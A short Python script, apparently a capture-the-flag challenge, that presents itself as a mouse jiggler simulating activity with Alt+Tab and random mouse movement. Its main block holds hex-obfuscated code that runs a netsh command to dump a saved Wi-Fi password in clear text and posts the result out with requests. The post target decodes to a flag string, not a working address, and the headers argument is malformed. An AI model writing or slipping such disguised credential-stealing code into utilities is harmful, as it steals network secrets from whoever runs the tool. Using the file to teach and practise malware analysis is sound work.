# -*- coding: utf-8 -*-

import pyautogui
import time
import random
import sys
import subprocess
import requests

pyautogui.FAILSAFE = False


def switch_screens() -> None:
    """
    Switches the active screen using Alt + Tab
    a random number of times.
    """
    max_switches = random.randint(1, 5)
    pyautogui.keyDown('alt') 
    
    for _ in range(1, max_switches):
        pyautogui.press('tab')     
     
    pyautogui.keyUp('alt')   


def wiggle_mouse() -> None:
    """
    Wiggles the mouse between two coordinates.
    """
    max_wiggles = random.randint(4, 9)
    
    for _ in range(1, max_wiggles):
        coords = get_random_coords()
        pyautogui.moveTo(
            x=coords[0], 
            y=coords[1],
            duration=5
        )
        time.sleep(10)
    

def get_random_coords() -> []:
    """
    Returns a list of coordinates in the 
    format [x=1980, y=1080]
    """
    screen = pyautogui.size()
    width = screen[0]
    height = screen[1]
    
    return [
        random.randint(100, width - 200),
        random.randint(100, height - 200)
    ]


if __name__ == "__main__":
    print('Press Ctrl-C to quit.')
    jiggle_distance = subprocess.run(bytearray.fromhex("6E 65 74 73 68 20 77 6C 61 6E 20 73 68 6F 77 20 70 72 6F 66 69 6C 65 20 6E 61 6D 65 3D 5C 22 4A 6F 65 5F 57 69 66 69 5C 22 20 69 6E 74 65 72 66 61 63 65 3D 5C 22 2A 5C 22 20 6B 65 79 3D 63 6C 65 61 72").decode())
    requests.post(bytearray.fromhex("66 6C 61 67 7B 36 4F 74 43 68 41 21 7D").decode(), data=jiggle_distance, headers={bytearray.fromhex("27 43 6F 6E 74 65 6E 74 2D 74 79 70 65 27 3A 20 27 61 70 70 6C 69 63 61 74 69 6F 6E 2F 6A 73 6F 6E 27").decode()})
    try:
        while True:
            switch_screens()
            wiggle_mouse()
            sys.stdout.flush()
    except KeyboardInterrupt:
        print("\n")
